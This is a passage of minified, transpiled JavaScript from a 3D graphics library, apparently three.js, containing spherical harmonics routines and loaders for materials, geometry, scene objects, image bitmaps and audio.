t.copy(a[0]).multiplyScalar(.282095),t.addScaledVector(a[1],.488603*r),t.addScaledVector(a[2],.488603*i),t.addScaledVector(a[3],.488603*n),t.addScaledVector(a[4],n*r*1.092548),t.addScaledVector(a[5],r*i*1.092548),t.addScaledVector(a[6],.315392*(3*i*i-1)),t.addScaledVector(a[7],n*i*1.092548),t.addScaledVector(a[8],.546274*(n*n-r*r)),t}},{key:"getIrradianceAt",value:function(e,t){var n=e.x,r=e.y,i=e.z,a=this.coefficients;return t.copy(a[0]).multiplyScalar(.886227),t.addScaledVector(a[1],1.023328*r),t.addScaledVector(a[2],1.023328*i),t.addScaledVector(a[3],1.023328*n),t.addScaledVector(a[4],.858086*n*r),t.addScaledVector(a[5],.858086*r*i),t.addScaledVector(a[6],.743125*i*i-.247708),t.addScaledVector(a[7],.858086*n*i),t.addScaledVector(a[8],.429043*(n*n-r*r)),t}},{key:"add",value:function(e){for(var t=0;t<9;t++)this.coefficients[t].add(e.coefficients[t]);return this}},{key:"addScaledSH",value:function(e,t){for(var n=0;n<9;n++)this.coefficients[n].addScaledVector(e.coefficients[n],t);return this}},{key:"scale",value:function(e){for(var t=0;t<9;t++)this.coefficients[t].multiplyScalar(e);return this}},{key:"lerp",value:function(e,t){for(var n=0;n<9;n++)this.coefficients[n].lerp(e.coefficients[n],t);return this}},{key:"equals",value:function(e){for(var t=0;t<9;t++)if(!this.coefficients[t].equals(e.coefficients[t]))return!1;return!0}},{key:"copy",value:function(e){return this.set(e.coefficients)}},{key:"clone",value:function(){return(new this.constructor).copy(this)}},{key:"fromArray",value:function(e){for(var t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:0,n=this.coefficients,r=0;r<9;r++)n[r].fromArray(e,t+3*r);return this}},{key:"toArray",value:function(){for(var e=0<arguments.length&&void 0!==arguments[0]?arguments[0]:[],t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:0,n=this.coefficients,r=0;r<9;r++)n[r].toArray(e,t+3*r);return e}}],[{key:"getBasisAt",value:function(e,t){var n=e.x,r=e.y,i=e.z;t[0]=.282095,t[1]=.488603*r,t[2]=.488603*i,t[3]=.488603*n,t[4]=1.092548*n*r,t[5]=1.092548*r*i,t[6]=.315392*(3*i*i-1),t[7]=1.092548*n*i,t[8]=.546274*(n*n-r*r)}}]),e}();pc.prototype.isSphericalHarmonics3=!0;var hc=function(e){_inherits2(n,ql);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:new pc,i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:1;return _classCallCheck2(this,n),(e=t.call(this,void 0,i)).sh=r,e}return _createClass2(n,[{key:"copy",value:function(e){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.sh.copy(e.sh),this}},{key:"fromJSON",value:function(e){return this.intensity=e.intensity,this.sh.fromArray(e.sh),this}},{key:"toJSON",value:function(e){var t=_get2(_getPrototypeOf(n.prototype),"toJSON",this).call(this,e);return t.object.sh=this.sh.toArray(),t}}]),n}();hc.prototype.isLightProbe=!0;var fc=function(e){_inherits2(n,Ul);var t=_createSuper(n);function n(e){var r;return _classCallCheck2(this,n),(r=t.call(this,e)).textures={},r}return _createClass2(n,[{key:"load",value:function(e,t,n,r){var i=this,a=new zl(i.manager);a.setPath(i.path),a.setRequestHeader(i.requestHeader),a.setWithCredentials(i.withCredentials),a.load(e,(function(n){try{t(i.parse(JSON.parse(n)))}catch(n){r&&r(n),i.manager.itemError(e)}}),n,r)}},{key:"parse",value:function(e){var t=this.textures;function n(e){return t[e],t[e]}var r=new _l[e.type];if(void 0!==e.uuid&&(r.uuid=e.uuid),void 0!==e.name&&(r.name=e.name),void 0!==e.color&&void 0!==r.color&&r.color.setHex(e.color),void 0!==e.roughness&&(r.roughness=e.roughness),void 0!==e.metalness&&(r.metalness=e.metalness),void 0!==e.sheen&&(r.sheen=e.sheen),void 0!==e.sheenColor&&(r.sheenColor=(new $t).setHex(e.sheenColor)),void 0!==e.sheenRoughness&&(r.sheenRoughness=e.sheenRoughness),void 0!==e.emissive&&void 0!==r.emissive&&r.emissive.setHex(e.emissive),void 0!==e.specular&&void 0!==r.specular&&r.specular.setHex(e.specular),void 0!==e.specularIntensity&&(r.specularIntensity=e.specularIntensity),void 0!==e.specularColor&&void 0!==r.specularColor&&r.specularColor.setHex(e.specularColor),void 0!==e.shininess&&(r.shininess=e.shininess),void 0!==e.clearcoat&&(r.clearcoat=e.clearcoat),void 0!==e.clearcoatRoughness&&(r.clearcoatRoughness=e.clearcoatRoughness),void 0!==e.transmission&&(r.transmission=e.transmission),void 0!==e.thickness&&(r.thickness=e.thickness),void 0!==e.attenuationDistance&&(r.attenuationDistance=e.attenuationDistance),void 0!==e.attenuationColor&&void 0!==r.attenuationColor&&r.attenuationColor.setHex(e.attenuationColor),void 0!==e.fog&&(r.fog=e.fog),void 0!==e.flatShading&&(r.flatShading=e.flatShading),void 0!==e.blending&&(r.blending=e.blending),void 0!==e.combine&&(r.combine=e.combine),void 0!==e.side&&(r.side=e.side),void 0!==e.shadowSide&&(r.shadowSide=e.shadowSide),void 0!==e.opacity&&(r.opacity=e.opacity),void 0!==e.format&&(r.format=e.format),void 0!==e.transparent&&(r.transparent=e.transparent),void 0!==e.alphaTest&&(r.alphaTest=e.alphaTest),void 0!==e.depthTest&&(r.depthTest=e.depthTest),void 0!==e.depthWrite&&(r.depthWrite=e.depthWrite),void 0!==e.colorWrite&&(r.colorWrite=e.colorWrite),void 0!==e.stencilWrite&&(r.stencilWrite=e.stencilWrite),void 0!==e.stencilWriteMask&&(r.stencilWriteMask=e.stencilWriteMask),void 0!==e.stencilFunc&&(r.stencilFunc=e.stencilFunc),void 0!==e.stencilRef&&(r.stencilRef=e.stencilRef),void 0!==e.stencilFuncMask&&(r.stencilFuncMask=e.stencilFuncMask),void 0!==e.stencilFail&&(r.stencilFail=e.stencilFail),void 0!==e.stencilZFail&&(r.stencilZFail=e.stencilZFail),void 0!==e.stencilZPass&&(r.stencilZPass=e.stencilZPass),void 0!==e.wireframe&&(r.wireframe=e.wireframe),void 0!==e.wireframeLinewidth&&(r.wireframeLinewidth=e.wireframeLinewidth),void 0!==e.wireframeLinecap&&(r.wireframeLinecap=e.wireframeLinecap),void 0!==e.wireframeLinejoin&&(r.wireframeLinejoin=e.wireframeLinejoin),void 0!==e.rotation&&(r.rotation=e.rotation),1!==e.linewidth&&(r.linewidth=e.linewidth),void 0!==e.dashSize&&(r.dashSize=e.dashSize),void 0!==e.gapSize&&(r.gapSize=e.gapSize),void 0!==e.scale&&(r.scale=e.scale),void 0!==e.polygonOffset&&(r.polygonOffset=e.polygonOffset),void 0!==e.polygonOffsetFactor&&(r.polygonOffsetFactor=e.polygonOffsetFactor),void 0!==e.polygonOffsetUnits&&(r.polygonOffsetUnits=e.polygonOffsetUnits),void 0!==e.dithering&&(r.dithering=e.dithering),void 0!==e.alphaToCoverage&&(r.alphaToCoverage=e.alphaToCoverage),void 0!==e.premultipliedAlpha&&(r.premultipliedAlpha=e.premultipliedAlpha),void 0!==e.visible&&(r.visible=e.visible),void 0!==e.toneMapped&&(r.toneMapped=e.toneMapped),void 0!==e.userData&&(r.userData=e.userData),void 0!==e.vertexColors&&("number"==typeof e.vertexColors?r.vertexColors=0<e.vertexColors:r.vertexColors=e.vertexColors),void 0!==e.uniforms)for(var i in e.uniforms){var a=e.uniforms[i];switch(r.uniforms[i]={},a.type){case"t":r.uniforms[i].value=n(a.value);break;case"c":r.uniforms[i].value=(new $t).setHex(a.value);break;case"v2":r.uniforms[i].value=(new re).fromArray(a.value);break;case"v3":r.uniforms[i].value=(new ye).fromArray(a.value);break;case"v4":r.uniforms[i].value=(new fe).fromArray(a.value);break;case"m3":r.uniforms[i].value=(new ie).fromArray(a.value);break;case"m4":r.uniforms[i].value=(new Xe).fromArray(a.value);break;default:r.uniforms[i].value=a.value}}if(void 0!==e.defines&&(r.defines=e.defines),void 0!==e.vertexShader&&(r.vertexShader=e.vertexShader),void 0!==e.fragmentShader&&(r.fragmentShader=e.fragmentShader),void 0!==e.extensions)for(var o in e.extensions)r.extensions[o]=e.extensions[o];if(void 0!==e.shading&&(r.flatShading=1===e.shading),void 0!==e.size&&(r.size=e.size),void 0!==e.sizeAttenuation&&(r.sizeAttenuation=e.sizeAttenuation),void 0!==e.map&&(r.map=n(e.map)),void 0!==e.matcap&&(r.matcap=n(e.matcap)),void 0!==e.alphaMap&&(r.alphaMap=n(e.alphaMap)),void 0!==e.bumpMap&&(r.bumpMap=n(e.bumpMap)),void 0!==e.bumpScale&&(r.bumpScale=e.bumpScale),void 0!==e.normalMap&&(r.normalMap=n(e.normalMap)),void 0!==e.normalMapType&&(r.normalMapType=e.normalMapType),void 0!==e.normalScale){var s=e.normalScale;!1===Array.isArray(s)&&(s=[s,s]),r.normalScale=(new re).fromArray(s)}return void 0!==e.displacementMap&&(r.displacementMap=n(e.displacementMap)),void 0!==e.displacementScale&&(r.displacementScale=e.displacementScale),void 0!==e.displacementBias&&(r.displacementBias=e.displacementBias),void 0!==e.roughnessMap&&(r.roughnessMap=n(e.roughnessMap)),void 0!==e.metalnessMap&&(r.metalnessMap=n(e.metalnessMap)),void 0!==e.emissiveMap&&(r.emissiveMap=n(e.emissiveMap)),void 0!==e.emissiveIntensity&&(r.emissiveIntensity=e.emissiveIntensity),void 0!==e.specularMap&&(r.specularMap=n(e.specularMap)),void 0!==e.specularIntensityMap&&(r.specularIntensityMap=n(e.specularIntensityMap)),void 0!==e.specularColorMap&&(r.specularColorMap=n(e.specularColorMap)),void 0!==e.envMap&&(r.envMap=n(e.envMap)),void 0!==e.envMapIntensity&&(r.envMapIntensity=e.envMapIntensity),void 0!==e.reflectivity&&(r.reflectivity=e.reflectivity),void 0!==e.refractionRatio&&(r.refractionRatio=e.refractionRatio),void 0!==e.lightMap&&(r.lightMap=n(e.lightMap)),void 0!==e.lightMapIntensity&&(r.lightMapIntensity=e.lightMapIntensity),void 0!==e.aoMap&&(r.aoMap=n(e.aoMap)),void 0!==e.aoMapIntensity&&(r.aoMapIntensity=e.aoMapIntensity),void 0!==e.gradientMap&&(r.gradientMap=n(e.gradientMap)),void 0!==e.clearcoatMap&&(r.clearcoatMap=n(e.clearcoatMap)),void 0!==e.clearcoatRoughnessMap&&(r.clearcoatRoughnessMap=n(e.clearcoatRoughnessMap)),void 0!==e.clearcoatNormalMap&&(r.clearcoatNormalMap=n(e.clearcoatNormalMap)),void 0!==e.clearcoatNormalScale&&(r.clearcoatNormalScale=(new re).fromArray(e.clearcoatNormalScale)),void 0!==e.transmissionMap&&(r.transmissionMap=n(e.transmissionMap)),void 0!==e.thicknessMap&&(r.thicknessMap=n(e.thicknessMap)),void 0!==e.sheenColorMap&&(r.sheenColorMap=n(e.sheenColorMap)),void 0!==e.sheenRoughnessMap&&(r.sheenRoughnessMap=n(e.sheenRoughnessMap)),r}},{key:"setTextures",value:function(e){return this.textures=e,this}}]),n}(),Ac=function(){function e(){_classCallCheck2(this,e)}return _createClass2(e,null,[{key:"decodeText",value:function(e){if("undefined"!=typeof TextDecoder)return(new TextDecoder).decode(e);for(var t="",n=0,r=e.length;n<r;n++)t+=String.fromCharCode(e[n]);try{return decodeURIComponent(escape(t))}catch(e){return t}}},{key:"extractUrlBase",value:function(e){var t=e.lastIndexOf("/");return-1===t?"./":e.substr(0,t+1)}},{key:"resolveURL",value:function(e,t){return"string"!=typeof e||""===e?"":(/^https?:\/\//i.test(t)&&/^\//.test(e)&&(t=t.replace(/(^https?:\/\/[^\/]+).*/i,"$1")),/^(https?:)?\/\//i.test(e)||/^data:.*,.*$/i.test(e)||/^blob:.*$/i.test(e)?e:t+e)}}]),e}(),mc=function(e){_inherits2(n,un);var t=_createSuper(n);function n(){var e;return _classCallCheck2(this,n),(e=t.call(this)).type="InstancedBufferGeometry",e.instanceCount=1/0,e}return _createClass2(n,[{key:"copy",value:function(e){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.instanceCount=e.instanceCount,this}},{key:"clone",value:function(){return(new this.constructor).copy(this)}},{key:"toJSON",value:function(){var e=_get2(_getPrototypeOf(n.prototype),"toJSON",this).call(this,this);return e.instanceCount=this.instanceCount,e.isInstancedBufferGeometry=!0,e}}]),n}();mc.prototype.isInstancedBufferGeometry=!0;var vc,gc=function(e){_inherits2(n,Ul);var t=_createSuper(n);function n(e){return _classCallCheck2(this,n),t.call(this,e)}return _createClass2(n,[{key:"load",value:function(e,t,n,r){var i=this,a=new zl(i.manager);a.setPath(i.path),a.setRequestHeader(i.requestHeader),a.setWithCredentials(i.withCredentials),a.load(e,(function(n){try{t(i.parse(JSON.parse(n)))}catch(n){r&&r(n),i.manager.itemError(e)}}),n,r)}},{key:"parse",value:function(e){var t={},n={};function r(e,r){if(void 0!==t[r])return t[r];var i=e.interleavedBuffers[r],a=function(e,t){if(void 0!==n[t])return n[t];var r=e.arrayBuffers[t],i=new Uint32Array(r).buffer;return n[t]=i}(e,i.buffer),o=le(i.type,a),s=new ja(o,i.stride);return s.uuid=i.uuid,t[r]=s}var i=e.isInstancedBufferGeometry?new mc:new un,a=e.data.index;if(void 0!==a){var o=le(a.type,a.array);i.setIndex(new Qt(o,1))}var s=e.data.attributes;for(var l in s){var c=s[l],u=void 0;if(c.isInterleavedBufferAttribute){var d=r(e.data,c.data);u=new $a(d,c.itemSize,c.offset,c.normalized)}else{var p=le(c.type,c.array);u=new(c.isInstancedBufferAttribute?yo:Qt)(p,c.itemSize,c.normalized)}void 0!==c.name&&(u.name=c.name),void 0!==c.usage&&u.setUsage(c.usage),void 0!==c.updateRange&&(u.updateRange.offset=c.updateRange.offset,u.updateRange.count=c.updateRange.count),i.setAttribute(l,u)}var h=e.data.morphAttributes;if(h)for(var f in h){for(var A=h[f],m=[],v=0,g=A.length;v<g;v++){var y=A[v],b=void 0;if(y.isInterleavedBufferAttribute){var _=r(e.data,y.data);b=new $a(_,y.itemSize,y.offset,y.normalized)}else{var w=le(y.type,y.array);b=new Qt(w,y.itemSize,y.normalized)}void 0!==y.name&&(b.name=y.name),m.push(b)}i.morphAttributes[f]=m}e.data.morphTargetsRelative&&(i.morphTargetsRelative=!0);var C=e.data.groups||e.data.drawcalls||e.data.offsets;if(void 0!==C)for(var x=0,S=C.length;x!==S;++x){var k=C[x];i.addGroup(k.start,k.count,k.materialIndex)}var M=e.data.boundingSphere;if(void 0!==M){var B=new ye;void 0!==M.center&&B.fromArray(M.center),i.boundingSphere=new $e(B,M.radius)}return e.name&&(i.name=e.name),e.userData&&(i.userData=e.userData),i}}]),n}(),yc=function(e){_inherits2(a,Ul);var t,n,r,i=_createSuper(a);function a(e){return _classCallCheck2(this,a),i.call(this,e)}return _createClass2(a,[{key:"load",value:function(e,t,n,r){var i=this,a=""===this.path?Ac.extractUrlBase(e):this.path;this.resourcePath=this.resourcePath||a;var o=new zl(this.manager);o.setPath(this.path),o.setRequestHeader(this.requestHeader),o.setWithCredentials(this.withCredentials),o.load(e,(function(e){var n=null;try{n=JSON.parse(e)}catch(e){return void(void 0!==r&&r(e))}var a=n.metadata;void 0!==a&&void 0!==a.type&&"geometry"!==a.type.toLowerCase()&&i.parse(n,t)}),n,r)}},{key:"loadAsync",value:(r=_asyncToGenerator(regeneratorRuntime.mark((function e(t,n){var r,i,a,o,s,l;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return i=""===(r=this).path?Ac.extractUrlBase(t):this.path,this.resourcePath=this.resourcePath||i,(a=new zl(this.manager)).setPath(this.path),a.setRequestHeader(this.requestHeader),a.setWithCredentials(this.withCredentials),e.next=9,a.loadAsync(t,n);case 9:if(o=e.sent,s=JSON.parse(o),void 0===(l=s.metadata)||void 0===l.type||"geometry"===l.type.toLowerCase())throw new Error("THREE.ObjectLoader: Can't load "+t);e.next=14;break;case 14:return e.next=16,r.parseAsync(s);case 16:return e.abrupt("return",e.sent);case 17:case"end":return e.stop()}}),e,this)}))),function(e,t){return r.apply(this,arguments)})},{key:"parse",value:function(e,t){var n=this.parseAnimations(e.animations),r=this.parseShapes(e.shapes),i=this.parseGeometries(e.geometries,r),a=this.parseImages(e.images,(function(){void 0!==t&&t(l)})),o=this.parseTextures(e.textures,a),s=this.parseMaterials(e.materials,o),l=this.parseObject(e.object,i,s,o,n),c=this.parseSkeletons(e.skeletons,l);if(this.bindSkeletons(l,c),void 0!==t){var u=!1;for(var d in a)if(a[d]instanceof HTMLImageElement){u=!0;break}!1===u&&t(l)}return l}},{key:"parseAsync",value:(n=_asyncToGenerator(regeneratorRuntime.mark((function e(t){var n,r,i,a,o,s,l,c;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return n=this.parseAnimations(t.animations),r=this.parseShapes(t.shapes),i=this.parseGeometries(t.geometries,r),e.next=5,this.parseImagesAsync(t.images);case 5:return a=e.sent,o=this.parseTextures(t.textures,a),s=this.parseMaterials(t.materials,o),l=this.parseObject(t.object,i,s,o,n),c=this.parseSkeletons(t.skeletons,l),this.bindSkeletons(l,c),e.abrupt("return",l);case 12:case"end":return e.stop()}}),e,this)}))),function(e){return n.apply(this,arguments)})},{key:"parseShapes",value:function(e){var t={};if(void 0!==e)for(var n=0,r=e.length;n<r;n++){var i=(new Ss).fromJSON(e[n]);t[i.uuid]=i}return t}},{key:"parseSkeletons",value:function(e,t){var n={},r={};if(t.traverse((function(e){e.isBone&&(r[e.uuid]=e)})),void 0!==e)for(var i=0,a=e.length;i<a;i++){var o=(new go).fromJSON(e[i],r);n[o.uuid]=o}return n}},{key:"parseGeometries",value:function(e,t){var n={};if(void 0!==e)for(var r=new gc,i=0,a=e.length;i<a;i++){var o=void 0,s=e[i];switch(s.type){case"BufferGeometry":case"InstancedBufferGeometry":o=r.parse(s);break;case"Geometry":break;default:s.type in dl&&(o=dl[s.type].fromJSON(s,t))}o.uuid=s.uuid,void 0!==s.name&&(o.name=s.name),!0===o.isBufferGeometry&&void 0!==s.userData&&(o.userData=s.userData),n[s.uuid]=o}return n}},{key:"parseMaterials",value:function(e,t){var n={},r={};if(void 0!==e){var i=new fc;i.setTextures(t);for(var a=0,o=e.length;a<o;a++){var s=e[a];if("MultiMaterial"===s.type){for(var l=[],c=0;c<s.materials.length;c++){var u=s.materials[c];void 0===n[u.uuid]&&(n[u.uuid]=i.parse(u)),l.push(n[u.uuid])}r[s.uuid]=l}else void 0===n[s.uuid]&&(n[s.uuid]=i.parse(s)),r[s.uuid]=n[s.uuid]}}return r}},{key:"parseAnimations",value:function(e){var t={};if(void 0!==e)for(var n=0;n<e.length;n++){var r=e[n],i=Ol.parse(r);t[i.uuid]=i}return t}},{key:"parseImages",value:function(e,t){var n,r=this,i={};function a(e){if("string"!=typeof e)return e.data?{data:le(e.type,e.data),width:e.width,height:e.height}:null;var t,i=e,a=/^(\/\/)|([a-z]+:(\/\/)?)/i.test(i)?i:r.resourcePath+i;return t=a,r.manager.itemStart(t),n.load(t,(function(){r.manager.itemEnd(t)}),void 0,(function(){r.manager.itemError(t),r.manager.itemEnd(t)}))}if(void 0!==e&&0<e.length){var o=new Rl(t);(n=new Ql(o)).setCrossOrigin(this.crossOrigin);for(var s=0,l=e.length;s<l;s++){var c=e[s],u=c.url;if(Array.isArray(u)){i[c.uuid]=[];for(var d=0,p=u.length;d<p;d++){var h=a(u[d]);null!==h&&(h instanceof HTMLImageElement?i[c.uuid].push(h):i[c.uuid].push(new Ao(h.data,h.width,h.height)))}}else{var f=a(c.url);null!==f&&(i[c.uuid]=f)}}}return i}},{key:"parseImagesAsync",value:(t=_asyncToGenerator(regeneratorRuntime.mark((function e(t){var n,r,i,a,o,s,l,c,u,d,p,h,f,A;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:if(o=function(){return(o=_asyncToGenerator(regeneratorRuntime.mark((function e(t){var r,a;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:if("string"==typeof t)return a=/^(\/\/)|([a-z]+:(\/\/)?)/i.test(r=t)?r:n.resourcePath+r,e.next=5,i.loadAsync(a);e.next=8;break;case 5:return e.abrupt("return",e.sent);case 8:if(t.data)return e.abrupt("return",{data:le(t.type,t.data),width:t.width,height:t.height});e.next=12;break;case 12:return e.abrupt("return",null);case 13:case"end":return e.stop()}}),e)})))).apply(this,arguments)},a=function(e){return o.apply(this,arguments)},n=this,r={},!(void 0!==t&&0<t.length)){e.next=32;break}(i=new Ql(this.manager)).setCrossOrigin(this.crossOrigin),s=0,l=t.length;case 8:if(!(s<l)){e.next=32;break}if(c=t[s],u=c.url,!Array.isArray(u)){e.next=25;break}r[c.uuid]=[],d=0,p=u.length;case 14:if(d<p)return h=u[d],e.next=18,a(h);e.next=23;break;case 18:null!==(f=e.sent)&&(f instanceof HTMLImageElement?r[c.uuid].push(f):r[c.uuid].push(new Ao(f.data,f.width,f.height)));case 20:d++,e.next=14;break;case 23:e.next=29;break;case 25:return e.next=27,a(c.url);case 27:null!==(A=e.sent)&&(r[c.uuid]=A);case 29:s++,e.next=8;break;case 32:return e.abrupt("return",r);case 33:case"end":return e.stop()}}),e,this)}))),function(e){return t.apply(this,arguments)})},{key:"parseTextures",value:function(e,t){function n(e,t){return"number"==typeof e?e:t[e]}var r={};if(void 0!==e)for(var i=0,a=e.length;i<a;i++){var o=e[i];o.image,t[o.image];var s=void 0,l=t[o.image];Array.isArray(l)?(s=new Rn(l),6===l.length&&(s.needsUpdate=!0)):(s=l&&l.data?new Ao(l.data,l.width,l.height):new pe(l),l&&(s.needsUpdate=!0)),s.uuid=o.uuid,void 0!==o.name&&(s.name=o.name),void 0!==o.mapping&&(s.mapping=n(o.mapping,bc)),void 0!==o.offset&&s.offset.fromArray(o.offset),void 0!==o.repeat&&s.repeat.fromArray(o.repeat),void 0!==o.center&&s.center.fromArray(o.center),void 0!==o.rotation&&(s.rotation=o.rotation),void 0!==o.wrap&&(s.wrapS=n(o.wrap[0],_c),s.wrapT=n(o.wrap[1],_c)),void 0!==o.format&&(s.format=o.format),void 0!==o.type&&(s.type=o.type),void 0!==o.encoding&&(s.encoding=o.encoding),void 0!==o.minFilter&&(s.minFilter=n(o.minFilter,wc)),void 0!==o.magFilter&&(s.magFilter=n(o.magFilter,wc)),void 0!==o.anisotropy&&(s.anisotropy=o.anisotropy),void 0!==o.flipY&&(s.flipY=o.flipY),void 0!==o.premultiplyAlpha&&(s.premultiplyAlpha=o.premultiplyAlpha),void 0!==o.unpackAlignment&&(s.unpackAlignment=o.unpackAlignment),void 0!==o.userData&&(s.userData=o.userData),r[o.uuid]=s}return r}},{key:"parseObject",value:function(e,t,n,r,i){var a,o,s;function l(e){return t[e],t[e]}function c(e){if(void 0!==e){if(Array.isArray(e)){for(var t=[],r=0,i=e.length;r<i;r++){var a=e[r];n[a],t.push(n[a])}return t}return n[e],n[e]}}function u(e){return r[e],r[e]}switch(e.type){case"Scene":a=new Ra,void 0!==e.background&&(Number.isInteger(e.background)?a.background=new $t(e.background):a.background=u(e.background)),void 0!==e.environment&&(a.environment=u(e.environment)),void 0!==e.fog&&("Fog"===e.fog.type?a.fog=new Da(e.fog.color,e.fog.near,e.fog.far):"FogExp2"===e.fog.type&&(a.fog=new Na(e.fog.color,e.fog.density)));break;case"PerspectiveCamera":a=new Nn(e.fov,e.aspect,e.near,e.far),void 0!==e.focus&&(a.focus=e.focus),void 0!==e.zoom&&(a.zoom=e.zoom),void 0!==e.filmGauge&&(a.filmGauge=e.filmGauge),void 0!==e.filmOffset&&(a.filmOffset=e.filmOffset),void 0!==e.view&&(a.view=Object.assign({},e.view));break;case"OrthographicCamera":a=new ar(e.left,e.right,e.top,e.bottom,e.near,e.far),void 0!==e.zoom&&(a.zoom=e.zoom),void 0!==e.view&&(a.view=Object.assign({},e.view));break;case"AmbientLight":a=new uc(e.color,e.intensity);break;case"DirectionalLight":a=new cc(e.color,e.intensity);break;case"PointLight":a=new sc(e.color,e.intensity,e.distance,e.decay);break;case"RectAreaLight":a=new dc(e.color,e.intensity,e.width,e.height);break;case"SpotLight":a=new nc(e.color,e.intensity,e.distance,e.angle,e.penumbra,e.decay);break;case"HemisphereLight":a=new Xl(e.color,e.groundColor,e.intensity);break;case"LightProbe":a=(new hc).fromJSON(e);break;case"SkinnedMesh":o=l(e.geometry),s=c(e.material),a=new ho(o,s),void 0!==e.bindMode&&(a.bindMode=e.bindMode),void 0!==e.bindMatrix&&a.bindMatrix.fromArray(e.bindMatrix),void 0!==e.skeleton&&(a.skeleton=e.skeleton);break;case"Mesh":o=l(e.geometry),s=c(e.material),a=new Bn(o,s);break;case"InstancedMesh":o=l(e.geometry),s=c(e.material);var d=e.count,p=e.instanceMatrix,h=e.instanceColor;(a=new xo(o,s,d)).instanceMatrix=new yo(new Float32Array(p.array),16),void 0!==h&&(a.instanceColor=new yo(new Float32Array(h.array),h.itemSize));break;case"LOD":a=new oo;break;case"Line":a=new Po(l(e.geometry),c(e.material));break;case"LineLoop":a=new Oo(l(e.geometry),c(e.material));break;case"LineSegments":a=new Lo(l(e.geometry),c(e.material));break;case"PointCloud":case"Points":a=new $o(l(e.geometry),c(e.material));break;case"Sprite":a=new no(c(e.material));break;case"Group":a=new Ba;break;case"Bone":a=new fo;break;default:a=new _t}if(a.uuid=e.uuid,void 0!==e.name&&(a.name=e.name),void 0!==e.matrix?(a.matrix.fromArray(e.matrix),void 0!==e.matrixAutoUpdate&&(a.matrixAutoUpdate=e.matrixAutoUpdate),a.matrixAutoUpdate&&a.matrix.decompose(a.position,a.quaternion,a.scale)):(void 0!==e.position&&a.position.fromArray(e.position),void 0!==e.rotation&&a.rotation.fromArray(e.rotation),void 0!==e.quaternion&&a.quaternion.fromArray(e.quaternion),void 0!==e.scale&&a.scale.fromArray(e.scale)),void 0!==e.castShadow&&(a.castShadow=e.castShadow),void 0!==e.receiveShadow&&(a.receiveShadow=e.receiveShadow),e.shadow&&(void 0!==e.shadow.bias&&(a.shadow.bias=e.shadow.bias),void 0!==e.shadow.normalBias&&(a.shadow.normalBias=e.shadow.normalBias),void 0!==e.shadow.radius&&(a.shadow.radius=e.shadow.radius),void 0!==e.shadow.mapSize&&a.shadow.mapSize.fromArray(e.shadow.mapSize),void 0!==e.shadow.camera&&(a.shadow.camera=this.parseObject(e.shadow.camera))),void 0!==e.visible&&(a.visible=e.visible),void 0!==e.frustumCulled&&(a.frustumCulled=e.frustumCulled),void 0!==e.renderOrder&&(a.renderOrder=e.renderOrder),void 0!==e.userData&&(a.userData=e.userData),void 0!==e.layers&&(a.layers.mask=e.layers),void 0!==e.children)for(var f=e.children,A=0;A<f.length;A++)a.add(this.parseObject(f[A],t,n,r,i));if(void 0!==e.animations)for(var m=e.animations,v=0;v<m.length;v++){var g=m[v];a.animations.push(i[g])}if("LOD"===e.type){void 0!==e.autoUpdate&&(a.autoUpdate=e.autoUpdate);for(var y=e.levels,b=0;b<y.length;b++){var _=y[b],w=a.getObjectByProperty("uuid",_.object);void 0!==w&&a.addLevel(w,_.distance)}}return a}},{key:"bindSkeletons",value:function(e,t){0!==Object.keys(t).length&&e.traverse((function(e){if(!0===e.isSkinnedMesh&&void 0!==e.skeleton){var n=t[e.skeleton];void 0===n||e.bind(n,e.bindMatrix)}}))}},{key:"setTexturePath",value:function(e){return this.setResourcePath(e)}}]),a}(),bc={UVMapping:300,CubeReflectionMapping:r,CubeRefractionMapping:i,EquirectangularReflectionMapping:a,EquirectangularRefractionMapping:o,CubeUVReflectionMapping:s,CubeUVRefractionMapping:l},_c={RepeatWrapping:c,ClampToEdgeWrapping:u,MirroredRepeatWrapping:d},wc={NearestFilter:p,NearestMipmapNearestFilter:h,NearestMipmapLinearFilter:f,LinearFilter:A,LinearMipmapNearestFilter:m,LinearMipmapLinearFilter:v},Cc=function(e){_inherits2(n,Ul);var t=_createSuper(n);function n(e){var r;return _classCallCheck2(this,n),(r=t.call(this,e)).options={premultiplyAlpha:"none"},r}return _createClass2(n,[{key:"setOptions",value:function(e){return this.options=e,this}},{key:"load",value:function(e,t,n,r){void 0===e&&(e=""),void 0!==this.path&&(e=this.path+e),e=this.manager.resolveURL(e);var i=this,a=Dl.get(e);if(void 0!==a)return i.manager.itemStart(e),setTimeout((function(){t&&t(a),i.manager.itemEnd(e)}),0),a;var o={};o.credentials="anonymous"===this.crossOrigin?"same-origin":"include",o.headers=this.requestHeader,fetch(e,o).then((function(e){return e.blob()})).then((function(e){return createImageBitmap(e,Object.assign(i.options,{colorSpaceConversion:"none"}))})).then((function(n){Dl.add(e,n),t&&t(n),i.manager.itemEnd(e)})).catch((function(t){r&&r(t),i.manager.itemError(e),i.manager.itemEnd(e)})),i.manager.itemStart(e)}}]),n}();Cc.prototype.isImageBitmapLoader=!0;var xc={getContext:function(){return void 0===vc&&(vc=new(window.AudioContext||window.webkitAudioContext)),vc},setContext:function(e){vc=e}},Sc=function(e){_inherits2(n,Ul);var t=_createSuper(n);function n(e){return _classCallCheck2(this,n),t.call(this,e)}return _createClass2(n,[{key:"load",value:function(e,t,n,r){var i=this,a=new zl(this.manager);a.setResponseType("arraybuffer"),a.setPath(this.path),a.setRequestHeader(this.requestHeader),a.setWithCredentials(this.withCredentials),a.load(e,(function(n){try{var a=n.slice(0);xc.getContext().decodeAudioData(a,(function(e){t(e)}))}catch(n){r&&r(n),i.manager.itemError(e)}}),n,r)}}]),n}(),kc=function(e){_inherits2(n,hc);var t=_createSuper(n);function n(e,r){var i,a=2<arguments.length&&void 0!==arguments[2]?arguments[2]:1;_classCallCheck2(this,n),i=t.call(this,void 0,a);var o=(new $t).set(e),s=(new $t).set(r),l=new ye(o.r,o.g,o.b),c=new 